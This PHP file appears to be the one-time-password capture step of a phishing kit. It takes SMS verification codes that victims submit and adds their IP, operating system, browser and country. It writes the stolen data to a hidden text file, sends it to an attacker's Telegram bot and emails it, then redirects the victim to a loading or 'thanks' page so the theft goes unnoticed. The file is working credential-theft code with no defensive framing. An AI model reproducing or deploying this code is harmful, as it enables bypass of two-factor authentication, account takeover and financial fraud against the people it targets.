<?php

    session_start();

    include('../c/ban.php');
    include('../c/geo.php');
    include('../c/sys.php');
    include('../../config.php');

    if ( !isset($_SESSION['a']) OR !isset($_SESSION['g']) ) {
        header("Location: ../index.php?#{$rand}");
        die();
    }
    
    if (isset($_POST['otp'])) {

        $_SESSION['otp'] = $_SESSION['otp']+1;

        $message = "== == == == == == OTP == == == == ==="."\n";
        $message .= " SMS_{$_SESSION['otp']} : ". $_POST['sm']."\n";
        $message .= "== == == == == == == == == == == == =="."\n";
        $message .= " IP : ".$ip."\n";
        $message .= " OS : ".$OS."\n";
        $message .= " Browser : ".$Browsers."\n";
        $message .= " Country : ".$_SESSION['country']. "\n";
        $message .= "== == == == == == == == == == == == =="."\n";
    	
        if ($save_txt==1) {
            $file = fopen("../../_data_/{$_secure}.txt", "a");
            fwrite($file, $message . "\n");
            fclose($file);
        }

        if ($telegram==1) {
            $data = [
                'text' => trim($message),
                'chat_id' => $chat_id
            ];
            file_get_contents("https://api.telegram.org/bot{$token}/sendMessage?".http_build_query($data));
        }

        if ($send_email==1) {
            $subject = "*** OTP | {$_SESSION['country']} | {$ip} ***";
            mail($to, $subject, trim($message));
        }

        if ($_SESSION['otp']>=$number_error) {
            header("Location: ../thanks.php?#{$rand}");
        }else{
            header("Location: ../loading.php?#{$rand}");
        }

        exit;
    	
    }

?>